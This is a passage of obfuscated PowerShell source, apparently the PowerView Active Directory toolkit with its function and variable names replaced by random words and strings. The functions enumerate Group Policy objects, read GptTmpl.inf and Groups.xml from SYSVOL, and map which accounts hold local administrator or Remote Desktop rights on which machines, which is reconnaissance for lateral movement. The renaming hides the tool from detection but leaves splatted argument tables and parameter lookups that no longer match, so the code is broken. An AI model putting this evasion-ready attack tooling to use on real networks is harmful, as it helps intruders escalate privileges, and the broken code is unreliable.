                $ENTkuvph99 = @()
                $ENTkuvph99 += $GXfnLfMX99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $GXfnLfMX99.SubString($GXfnLfMX99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[bridals] object OUs: $ENTkuvph99"
                if ($ENTkuvph99) {
                    $XVFWmInN99.Remove('Properties')
                    $iFsCZZQH99 = $False
                    ForEach($dLTgyVdw99 in $ENTkuvph99) {
                        $XVFWmInN99['Identity'] = $dLTgyVdw99
                        $qOUgKbli99 += infuriating @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $qOlZZMlS99 = $Parts[1]
                                        if ($iFsCZZQH99) {
                                            if ($qOlZZMlS99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                $iFsCZZQH99 = $True
                            }
                        }
                    }
                }
                if ($KcsUhItY99) {
                    $pjNiFmhq99 = (locking -cSHFXHUa99 $KcsUhItY99).SiteName
                    if($pjNiFmhq99 -and ($pjNiFmhq99 -notlike 'Error*')) {
                        $XVFWmInN99['Identity'] = $pjNiFmhq99
                        $qOUgKbli99 += bifurcating @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                $WsFHbNXK99 = $GXfnLfMX99.SubString($GXfnLfMX99.IndexOf('DC='))
                $XVFWmInN99.Remove('Identity')
                $XVFWmInN99.Remove('Properties')
                $XVFWmInN99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$WsFHbNXK99)"
                $qOUgKbli99 += trashier @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[bridals] GPOAdsPaths: $qOUgKbli99"
                if ($pOrzlwhD99) { $XVFWmInN99['Properties'] = $pOrzlwhD99 }
                else { $XVFWmInN99.Remove('Properties') }
                $XVFWmInN99.Remove('Identity')
                $qOUgKbli99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $XVFWmInN99['SearchBase'] = $_
                    $XVFWmInN99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    trashier @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $igkjuUBu99 = ''
                $pIJjStMG99 = ''
                $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                    $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($vNrdYYXO99 -match 'LDAP://|^CN=.*') {
                        $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[bridals] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                            $XVFWmInN99['Domain'] = $CtdjjEVe99
                            $CbdswDUU99 = maroons @SearcherArguments
                            if (-not $CbdswDUU99) {
                                Write-Warning "[bridals] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                            }
                        }
                    }
                    elseif ($vNrdYYXO99 -match '{.*}') {
                        $igkjuUBu99 += "(name=$vNrdYYXO99)"
                    }
                    else {
                        try {
                            $VAqEOfOY99 = (-Join (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                        }
                        catch {
                            $igkjuUBu99 += "(displayname=$vNrdYYXO99)"
                        }
                    }
                }
                if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                    $pIJjStMG99 += "(|$igkjuUBu99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[bridals] Using additional LDAP filter: $SeHRgLsL99"
                    $pIJjStMG99 += "$SeHRgLsL99"
                }
                $CbdswDUU99.filter = "(&(objectCategory=groupPolicyContainer)$pIJjStMG99)"
                Write-Verbose "[bridals] filter string: $($CbdswDUU99.filter)"
                if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $CbdswDUU99.FindOne() }
                else { $CmGXBhUd99 = $CbdswDUU99.FindAll() }
                $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($WdOnSHnL99 -Match '^GC://')) {
                            $GPO = foregather -ycQOyvWh99 $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $kcPsmpEF99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $DIyevQJa99 = "\\$kcPsmpEF99\SysVol\$kcPsmpEF99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $DIyevQJa99
                            }
                            catch {
                                Write-Verbose "[bridals] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = foregather -ycQOyvWh99 $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($CmGXBhUd99) {
                    try { $CmGXBhUd99.dispose() }
                    catch {
                        Write-Verbose "[bridals] Error disposing of the Results object: $_"
                    }
                }
                $CbdswDUU99.dispose()
            }
        }
    }
}
function donkey {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $feaYcbZI99,
        [Switch]
        $ViJzmwdR99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $XVFWmInN99['LDAPFilter'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $AGFeaaHg99 = @{}
        if ($PSBoundParameters['Domain']) { $AGFeaaHg99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $AGFeaaHg99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['Credential']) { $AGFeaaHg99['Credential'] = $fjBNCklg99 }
        $mdBcDaJr99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $XVFWmInN99['Identity'] = $feaYcbZI99 }
        bridals @SearcherArguments | ForEach-Object {
            $ifdnByzw99 = $_.displayname
            $FxvyExlL99 = $_.name
            $moqijghq99 = $_.gpcfilesyspath
            $vmWPkXAG99 =  @{ 'GptTmplPath' = "$moqijghq99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $vmWPkXAG99['Credential'] = $fjBNCklg99 }
            $Inf = Chesterfield @ParseArgs
            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $YEoIyvUW99 = @{}
                ForEach ($SUpogMWY99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $qsxdHmBG99 = $SUpogMWY99.Key.Split('__', $mdBcDaJr99) | ForEach-Object {$_.Trim()}
                    $WNDPRYmX99 = $SUpogMWY99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $NnlnfVgC99 = @()
                        ForEach ($AJyGNBNz99 in $WNDPRYmX99) {
                            if ($AJyGNBNz99 -and ($AJyGNBNz99.Trim() -ne '')) {
                                if ($AJyGNBNz99 -notmatch '^S-1-.*') {
                                    $TAjlXtfc99 = @{'ObjectName' = $AJyGNBNz99}
                                    if ($PSBoundParameters['Domain']) { $TAjlXtfc99['Domain'] = $jnYnRnFJ99 }
                                    $FPYfcegl99 = theoretic @ConvertToArguments
                                    if ($FPYfcegl99) {
                                        $NnlnfVgC99 += $FPYfcegl99
                                    }
                                    else {
                                        $NnlnfVgC99 += $AJyGNBNz99
                                    }
                                }
                                else {
                                    $NnlnfVgC99 += $AJyGNBNz99
                                }
                            }
                        }
                        $WNDPRYmX99 = $NnlnfVgC99
                    }
                    if (-not $YEoIyvUW99[$Group]) {
                        $YEoIyvUW99[$Group] = @{}
                    }
                    if ($WNDPRYmX99 -isnot [System.Array]) {$WNDPRYmX99 = @($WNDPRYmX99)}
                    $YEoIyvUW99[$Group].Add($qsxdHmBG99, $WNDPRYmX99)
                }
                ForEach ($SUpogMWY99 in $YEoIyvUW99.GetEnumerator()) {
                    if ($SUpogMWY99 -and $SUpogMWY99.Key -and ($SUpogMWY99.Key -match '^\*')) {
                        $PzXOJiqw99 = $SUpogMWY99.Key.Trim('*')
                        if ($PzXOJiqw99 -and ($PzXOJiqw99.Trim() -ne '')) {
                            $EidYTRyh99 = belonging -ObjectSID $PzXOJiqw99 @ConvertArguments
                        }
                        else {
                            $EidYTRyh99 = $False
                        }
                    }
                    else {
                        $EidYTRyh99 = $SUpogMWY99.Key
                        if ($EidYTRyh99 -and ($EidYTRyh99.Trim() -ne '')) {
                            if ($EidYTRyh99 -match 'Administrators') {
                                $PzXOJiqw99 = 'S-1-5-32-544'
                            }
                            elseif ($EidYTRyh99 -match 'Remote Desktop') {
                                $PzXOJiqw99 = 'S-1-5-32-555'
                            }
                            elseif ($EidYTRyh99 -match 'Guests') {
                                $PzXOJiqw99 = 'S-1-5-32-546'
                            }
                            elseif ($EidYTRyh99.Trim() -ne '') {
                                $TAjlXtfc99 = @{'ObjectName' = $EidYTRyh99}
                                if ($PSBoundParameters['Domain']) { $TAjlXtfc99['Domain'] = $jnYnRnFJ99 }
                                $PzXOJiqw99 = theoretic @ConvertToArguments
                            }
                            else {
                                $PzXOJiqw99 = $Null
                            }
                        }
                    }
                    $TyqiGpYN99 = New-Object PSObject
                    $TyqiGpYN99 | Add-Member Noteproperty 'GPODisplayName' $ifdnByzw99
                    $TyqiGpYN99 | Add-Member Noteproperty 'GPOName' $FxvyExlL99
                    $TyqiGpYN99 | Add-Member Noteproperty 'GPOPath' $moqijghq99
                    $TyqiGpYN99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $TyqiGpYN99 | Add-Member Noteproperty 'Filters' $Null
                    $TyqiGpYN99 | Add-Member Noteproperty 'GroupName' $EidYTRyh99
                    $TyqiGpYN99 | Add-Member Noteproperty 'GroupSID' $PzXOJiqw99
                    $TyqiGpYN99 | Add-Member Noteproperty 'GroupMemberOf' $SUpogMWY99.Value.Memberof
                    $TyqiGpYN99 | Add-Member Noteproperty 'GroupMembers' $SUpogMWY99.Value.Members
                    $TyqiGpYN99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $TyqiGpYN99
                }
            }
            $vmWPkXAG99 =  @{
                'GroupsXMLpath' = "$moqijghq99\MACHINE\Preferences\Groups\Groups.xml"
            }
            abstraction @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $NnlnfVgC99 = @()
                    ForEach ($AJyGNBNz99 in $_.GroupMembers) {
                        if ($AJyGNBNz99 -and ($AJyGNBNz99.Trim() -ne '')) {
                            if ($AJyGNBNz99 -notmatch '^S-1-.*') {
                                $TAjlXtfc99 = @{'ObjectName' = $EidYTRyh99}
                                if ($PSBoundParameters['Domain']) { $TAjlXtfc99['Domain'] = $jnYnRnFJ99 }
                                $FPYfcegl99 = theoretic -jnYnRnFJ99 $jnYnRnFJ99 -GwxiGtHr99 $AJyGNBNz99
                                if ($FPYfcegl99) {
                                    $NnlnfVgC99 += $FPYfcegl99
                                }
                                else {
                                    $NnlnfVgC99 += $AJyGNBNz99
                                }
                            }
                            else {
                                $NnlnfVgC99 += $AJyGNBNz99
                            }
                        }
                    }
                    $_.GroupMembers = $NnlnfVgC99
                }
                $_ | Add-Member Noteproperty 'GPODisplayName' $ifdnByzw99
                $_ | Add-Member Noteproperty 'GPOName' $FxvyExlL99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}
function scubaed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $feaYcbZI99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $iqvwZgEM99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $JICMFjIO99 = @{}
        if ($PSBoundParameters['Domain']) { $JICMFjIO99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $JICMFjIO99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $JICMFjIO99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $JICMFjIO99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $JICMFjIO99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $JICMFjIO99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $JICMFjIO99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        $AkHQDBDY99 = @()
        if ($PSBoundParameters['Identity']) {
            $AkHQDBDY99 += trashier @CommonArguments -feaYcbZI99 $feaYcbZI99 | Select-Object -Expand objectsid
            $hQfkIWwT99 = $AkHQDBDY99
            if (-not $AkHQDBDY99) {
                Throw "[scubaed] Unable to retrieve SID for identity '$feaYcbZI99'"
            }
        }
        else {
            $AkHQDBDY99 = @('*')
        }
        if ($iqvwZgEM99 -match 'S-1-5') {
            $TriIeWEe99 = $iqvwZgEM99
        }
        elseif ($iqvwZgEM99 -match 'Admin') {
            $TriIeWEe99 = 'S-1-5-32-544'
        }
        else {
            $TriIeWEe99 = 'S-1-5-32-555'
        }
        if ($AkHQDBDY99[0] -ne '*') {
            ForEach ($yofMxotZ99 in $AkHQDBDY99) {
                Write-Verbose "[scubaed] Enumerating nested group memberships for: '$yofMxotZ99'"
                $AkHQDBDY99 += con @CommonArguments -ycQOyvWh99 'objectsid' -opuAHvjq99 $yofMxotZ99 | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose "[scubaed] Target localgroup SID: $TriIeWEe99"
        Write-Verbose "[scubaed] Effective target domain SIDs: $AkHQDBDY99"
        $xhHACDml99 = donkey @CommonArguments -ViJzmwdR99 | ForEach-Object {
            $TyqiGpYN99 = $_
            if ($TyqiGpYN99.GroupSID -match $TriIeWEe99) {
                $TyqiGpYN99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($AkHQDBDY99[0] -eq '*') -or ($AkHQDBDY99 -Contains $_) ) {
                        $TyqiGpYN99
                    }
                }
            }
            if ( ($TyqiGpYN99.GroupMemberOf -contains $TriIeWEe99) ) {
                if ( ($AkHQDBDY99[0] -eq '*') -or ($AkHQDBDY99 -Contains $TyqiGpYN99.GroupSID) ) {
                    $TyqiGpYN99
                }
            }
        } | Sort-Object -Property GPOName -Unique
        $xhHACDml99 | Where-Object {$_} | ForEach-Object {
            $FxvyExlL99 = $_.GPODisplayName
            $tGibjtmM99 = $_.GPOName
            $moqijghq99 = $_.GPOPath
            $NigIbYWy99 = $_.GPOType
            if ($_.GroupMembers) {
                $qyvFDNvY99 = $_.GroupMembers
            }
            else {
                $qyvFDNvY99 = $_.GroupSID
            }
            $UqlDhBTe99 = $_.Filters
            if ($AkHQDBDY99[0] -eq '*') {
                $tYoORIll99 = $qyvFDNvY99
            }
            else {
                $tYoORIll99 = $hQfkIWwT99
            }
            infuriating @CommonArguments -Raw -ycQOyvWh99 'name,distinguishedname' -IBwChXGj99 $tGibjtmM99 | ForEach-Object {
                if ($UqlDhBTe99) {
                    $XAnljDyy99 = cowing @CommonArguments -ycQOyvWh99 'dnshostname,distinguishedname' -WdOnSHnL99 $_.Path | Where-Object {$_.distinguishedname -match ($UqlDhBTe99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $XAnljDyy99 = cowing @CommonArguments -ycQOyvWh99 'dnshostname' -WdOnSHnL99 $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($XAnljDyy99) {
                    if ($XAnljDyy99 -isnot [System.Array]) {$XAnljDyy99 = @($XAnljDyy99)}
                    ForEach ($yofMxotZ99 in $tYoORIll99) {
                        $Object = trashier @CommonArguments -feaYcbZI99 $yofMxotZ99 -ycQOyvWh99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                        $QTriWEIL99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $nOuxpMOF99 = New-Object PSObject
                        $nOuxpMOF99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $nOuxpMOF99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $nOuxpMOF99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $nOuxpMOF99 | Add-Member Noteproperty 'Domain' $jnYnRnFJ99
                        $nOuxpMOF99 | Add-Member Noteproperty 'IsGroup' $QTriWEIL99
                        $nOuxpMOF99 | Add-Member Noteproperty 'GPODisplayName' $FxvyExlL99
                        $nOuxpMOF99 | Add-Member Noteproperty 'GPOGuid' $tGibjtmM99
                        $nOuxpMOF99 | Add-Member Noteproperty 'GPOPath' $moqijghq99
                        $nOuxpMOF99 | Add-Member Noteproperty 'GPOType' $NigIbYWy99
                        $nOuxpMOF99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $nOuxpMOF99 | Add-Member Noteproperty 'ComputerName' $XAnljDyy99
                        $nOuxpMOF99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $nOuxpMOF99
                    }
                }
            }
            bifurcating @CommonArguments -ycQOyvWh99 'siteobjectbl,distinguishedname' -IBwChXGj99 $tGibjtmM99 | ForEach-Object {
                ForEach ($yofMxotZ99 in $tYoORIll99) {
                    $Object = trashier @CommonArguments -feaYcbZI99 $yofMxotZ99 -ycQOyvWh99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                    $QTriWEIL99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                    $nOuxpMOF99 = New-Object PSObject
                    $nOuxpMOF99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $nOuxpMOF99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $nOuxpMOF99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $nOuxpMOF99 | Add-Member Noteproperty 'IsGroup' $QTriWEIL99
                    $nOuxpMOF99 | Add-Member Noteproperty 'Domain' $jnYnRnFJ99
                    $nOuxpMOF99 | Add-Member Noteproperty 'GPODisplayName' $FxvyExlL99
                    $nOuxpMOF99 | Add-Member Noteproperty 'GPOGuid' $tGibjtmM99
                    $nOuxpMOF99 | Add-Member Noteproperty 'GPOPath' $moqijghq99
                    $nOuxpMOF99 | Add-Member Noteproperty 'GPOType' $NigIbYWy99
                    $nOuxpMOF99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $nOuxpMOF99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $nOuxpMOF99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $nOuxpMOF99
                }
            }
        }
    }
}
function seemed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $vlwKkvTg99,
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $vagMZotQ99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $iqvwZgEM99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $JICMFjIO99 = @{}
        if ($PSBoundParameters['Domain']) { $JICMFjIO99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $JICMFjIO99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $JICMFjIO99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $JICMFjIO99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $JICMFjIO99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $JICMFjIO99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $JICMFjIO99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $uTCGOdyg99 = cowing @CommonArguments -feaYcbZI99 $vlwKkvTg99 -ycQOyvWh99 'distinguishedname,dnshostname'
            if (-not $uTCGOdyg99) {
                throw "[seemed] Computer $vlwKkvTg99 not found. Try a fully qualified host name."
            }
            ForEach ($GocAGaEB99 in $uTCGOdyg99) {
                $omRpYwKS99 = @()
                $DN = $GocAGaEB99.distinguishedname
                $eLvbaNVK99 = $DN.IndexOf('OU=')
                if ($eLvbaNVK99 -gt 0) {
                    $vCdeKjyx99 = $DN.SubString($eLvbaNVK99)
                }
                if ($vCdeKjyx99) {
                    $omRpYwKS99 += infuriating @CommonArguments -WdOnSHnL99 $vCdeKjyx99 -SeHRgLsL99 '(gplink=*)' | ForEach-Object {
                        Select-String -axISfSto99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $($GocAGaEB99.dnshostname)"
                $pjNiFmhq99 = (locking -cSHFXHUa99 $GocAGaEB99.dnshostname).SiteName
                if ($pjNiFmhq99 -and ($pjNiFmhq99 -notmatch 'Error')) {
                    $omRpYwKS99 += bifurcating @CommonArguments -feaYcbZI99 $pjNiFmhq99 -SeHRgLsL99 '(gplink=*)' | ForEach-Object {
                        Select-String -axISfSto99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $omRpYwKS99 | donkey @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $TyqiGpYN99 = $_
                    if($TyqiGpYN99.GroupMembers) {
                        $qyvFDNvY99 = $TyqiGpYN99.GroupMembers
                    }
                    else {
                        $qyvFDNvY99 = $TyqiGpYN99.GroupSID
                    }
                    $qyvFDNvY99 | ForEach-Object {
                        $Object = trashier @CommonArguments -feaYcbZI99 $_
                        $QTriWEIL99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $NgBYCMvJ99 = New-Object PSObject
                        $NgBYCMvJ99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99.dnshostname
                        $NgBYCMvJ99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $NgBYCMvJ99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $NgBYCMvJ99 | Add-Member Noteproperty 'ObjectSID' $_
                        $NgBYCMvJ99 | Add-Member Noteproperty 'IsGroup' $QTriWEIL99
                        $NgBYCMvJ99 | Add-Member Noteproperty 'GPODisplayName' $TyqiGpYN99.GPODisplayName
                        $NgBYCMvJ99 | Add-Member Noteproperty 'GPOGuid' $TyqiGpYN99.GPOName
                        $NgBYCMvJ99 | Add-Member Noteproperty 'GPOPath' $TyqiGpYN99.GPOPath
                        $NgBYCMvJ99 | Add-Member Noteproperty 'GPOType' $TyqiGpYN99.GPOType
                        $NgBYCMvJ99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $NgBYCMvJ99
                    }
                }
            }
        }
    }
}
function cupped {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $ysEjxCvL99 = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $AGFeaaHg99 = @{}
        if ($PSBoundParameters['Server']) { $AGFeaaHg99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['Credential']) { $AGFeaaHg99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
